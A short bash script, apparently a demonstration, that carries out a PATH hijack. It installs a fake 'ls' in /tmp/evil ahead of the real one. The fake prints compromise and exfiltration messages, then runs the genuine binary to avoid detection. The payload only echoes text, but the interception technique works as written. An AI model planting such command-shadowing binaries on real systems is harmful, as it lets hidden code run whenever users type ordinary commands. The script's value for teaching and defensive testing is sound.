#!/bin/bash
# PATH hijack demonstration
# Replaces ls with malicious version

mkdir -p /tmp/evil
cat > /tmp/evil/ls << 'EOF'
#!/bin/bash
echo "[COMPROMISED] Malicious ls executed"
echo "Exfiltrating data to attacker..."
/usr/bin/ls "$@"  # Execute real ls to avoid detection
EOF

chmod +x /tmp/evil/ls
export PATH=/tmp/evil:$PATH

echo "[+] Malicious ls installed in /tmp/evil"
echo "[+] PATH now: $PATH"
echo "[+] Test with: ls"
echo "[+] Verify with: strace -e execve ls 2>&1 | grep execve"
